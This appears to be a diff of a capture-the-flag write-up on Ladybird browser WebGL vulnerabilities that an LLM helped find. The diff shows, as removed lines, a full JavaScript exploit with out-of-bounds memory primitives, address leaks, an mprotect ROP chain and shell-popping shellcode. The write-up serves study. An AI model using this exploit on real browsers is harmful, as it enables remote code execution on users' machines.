@@ -136,7 +136,7 @@ So, meet GoPaTych - my LLM-neurobro who’s going to handle the code analysis fo
 files-to-prompt --cxml -n [source files ...] > files4prompt.xml
 ```
 
-After that, we’ll get a [file](./task/files2prompt.xml) ready to be sent to GoPaTych.
+After that, we’ll get a [file](./task/files4prompt.xml) ready to be sent to GoPaTych.
 
 Okay, but what about the prompt? How can we best instruct GoPaTych to find vulnerabilities and avoid him hallucinating? I think the smartest approach is to have him instruct himself based on our high-level analysis goals:
 
@@ -197,7 +197,7 @@ After the first try and just one minute of waiting, GoPaTych responded to this p
 
 While writing this writeup, I tried to reproduce the results — and in almost every run (with his memory disabled, if we can believe `OpenAI`), GoPaTych identified the same vulnerabilities (and sometimes even more...).
 
-So, if you want, you can try reproducing it yourself using [files2prompt.xml](./task/files2prompt.xml) and [prompt.md](./task/prompt.md).
+So, if you want, you can try reproducing it yourself using [files4prompt.xml](./task/files4prompt.xml) and [prompt.md](./task/prompt.md).
 
 To be honest, this isn’t the most representative use of GoPaTych’s vulnerability-hunting abilities - because, as we’ll see later, the vulnerable code is part of some very raw C++.
 
@@ -209,7 +209,7 @@ Anyway, let’s move on to the exact vulnerabilities.
 
 ![](./assets/trade_offer.png)
 
-I think I came to PWNers Haven after reading GoPaTych’s response. Let’s look at the first vulnerable function, `read_pixels`, which corresponds to the `readPixels` `WebGL` JS method:
+I think I came to PWNers Paradise after reading GoPaTych’s response. Let’s look at the first vulnerable function, `read_pixels`, which corresponds to the `readPixels` `WebGL` JS method:
 ```cpp
 void WebGL2RenderingContextImpl::read_pixels(WebIDL::Long x, WebIDL::Long y, WebIDL::Long width, WebIDL::Long height, WebIDL::UnsignedLong format, WebIDL::UnsignedLong type, GC::Root<WebIDL::ArrayBufferView> p
 ixels)
@@ -494,7 +494,7 @@ In Ladybird, we’ll see this:
   byteLength: 136
 [ 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, ...
 ```
-Wait - are those object addresses in plain sight? This is definitely PWNers' Haven...
+Wait - are those object addresses in plain sight? This is definitely PWNers' Paradise...
 
 ![](./assets/kek_leak.png)
 
@@ -684,8 +684,7 @@ Now, we easily end up with the following common general method to execute arbitr
 
 ![](./assets/mother_hacker.png)
 
-Putting it all together - and computing the previously omitted offsets - we end up with the complete exploit [script](./task/exploit.js). (Helper functions are omitted.)
-
+To put it all together we need just fill one gap - omitted exploit offsets (they can be easily found in debugger) and `shellcode` (we'll use the default one [generated](./task/shellcode.py) with `pwntools` for popping shell): 
 ```JavaScript
 // Generated with shellcode.py - just pops a shell
 const shellcode_bytes = new Uint8Array([0x6a,0x68,0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x2f,0x73,0x50,0x48,0x89,0xe7,0x68,0x72,0x69,0x1,0x1,0x81,0x34,0x24,0x1,0x1,0x1,0x1,0x31,0xf6,0x56,0x6a,0x8,0x5e,0x48,;
@@ -711,134 +710,9 @@ const ret_o            = 0x1060n;
 const ab_vtable_o      = 0x58
 // Offset of pointer localtion from the begging of ArrayBuffer with OOB
 const victim_pointer_o = 0xa0
-
-function exploit()
-{
-  console.log('exploit');
-
-  // Build OOB primitives using vulnerabilities and WebGL logic
-
-  const gl     = cnv.getContext("webgl2");
-  const tex    = gl.createTexture();
-  gl.bindTexture(gl.TEXTURE_2D, tex);
-
-  // One OOB function
-  // It represents simetry of exploited vulnerabilities
-  function oob(src, dest, sz)
-  {
-    const pw = sz;
-    const ph = 1;
-
-    gl.texImage2D(
-      gl.TEXTURE_2D,
-      0,
-      gl.RGBA,
-      pw,
-      ph,
-      0,
-      gl.RGBA,
-      gl.UNSIGNED_BYTE,
-      src
-    );
-
-    const fbo = gl.createFramebuffer();
-    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
-    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0,
-                            gl.TEXTURE_2D, tex, 0);
-
-    gl.readPixels(0, 0, pw, ph, gl.RGBA, gl.UNSIGNED_BYTE, dest);
-  }
-
-  // Write src to victim ignoring its size
-  function oob_write(victim, src)
-  {
-    oob(src, victim, src.length);
-  }
-
-  // Read dest from victim ignoring its size
-  function oob_read(victim, dest)
-  {
-    oob(victim, dest, dest.length);
-  }
-
-  // Buffer to store data for readig/writing
-  let buffer     = new Uint8Array(0xa8);
-  // trampoline buffer we will use for OOB access
-  // NOTE: It is small to force LibJS to use some
-  //       "Objects" storage for it instead of normal heap.
-  //       With small size sensitive data of victim_ab will
-  //       be stored right after the trampoline's ArrayBuffer.
-  let trampoline = new Uint8Array(0x20).fill(0x77);
-  // ArrayBuffer we will corrupt
-  let victim_ab  = new ArrayBuffer(0x300);
-  let victim     = new Uint8Array(victim_ab);
-  // We use victim's ArrayBuffer to save shellcode since we'll leak its address later
-  victim.set(shellcode_bytes, 0x00);
-
-  // 8-byte arbitrary read primitive based on writing arbitrary address in place of victim's pointer
-  function readq(address)
-  {
-    oob_read(trampoline, buffer);
-    buffer.set(pack(address), victim_pointer_o);
-    oob_write(trampoline, buffer);
-    return unpack(victim.slice(0x00, 0x08));
-  }
-
-  // 8-byte arbitrary write primitive similar to read
-  function writeq(address, value)
-  {
-    oob_read(trampoline, buffer);
-    buffer.set(pack(address), victim_pointer_o);
-    oob_write(trampoline, buffer);
-    victim.set(pack(value), 0x00);
-  }
-
-  // Just one OOB read to leak addresses
-  oob_read(trampoline, buffer);
-
-  // Leak of binary base
-  const binary        = unpack(buffer.slice(ab_vtable_o, ab_vtable_o+0x08)) - binary_leak_o;
-  loghex(binary);
-  // Leak heap address of shellcode
-  const victim_ab_buf = unpack(buffer.slice(victim_pointer_o, victim_pointer_o+0x08));
-  loghex(victim_ab_buf);
-
-
-  // Address of read GOT entry
-  const read_got = binary + read_got_o;
-  loghex(read_got);
-  // Leak libc from read GOT entry
-  const libc = readq(read_got) - libc_leak_o;
-  loghex(libc);
-  // Leak stack from libc's environ
-  const stack = readq(libc + environ_o);
-  loghex(stack);
-
-  // Compute target address for ROP - somewhere before JS script execution in call stack
-  const ret   = stack - ret_o;
-  let   ropsz = 0x00n;
-
-  // Add 8-byte to ROP
-  function p(q)
-  {
-    writeq(ret + ropsz, q);
-    ropsz += 0x08n;
-  }
-
-  // ROP
-  p(binary + pop_rdi_o);        // rdi -> page of shellcode
-  p(victim_ab_buf & (~0xFFFn));
-  p(binary + pop_rsi_o);        // rsi -> 0x1000 (size of page)
-  p(0x1000n);
-  p(binary + pop_rdx_o);        // rdx -> 0b111 (RWX permissions)
-  p(0x07n);
-  p(binary + mprotect_o);       // call mprotect
-  p(victim_ab_buf);             // jump to shellcode
-
-  // finish JS script execution to run shellcode
-}
 ```
-We run it on the remote target and get the following:
+
+After that, we end up with the complete exploit [script](./task/exploit.js). We run it on the remote target and get the following:
 ```[*] Switching to interactive mode
 Starting Ladybird...
 248106.266 WebContent(26): (js log) "exploit"
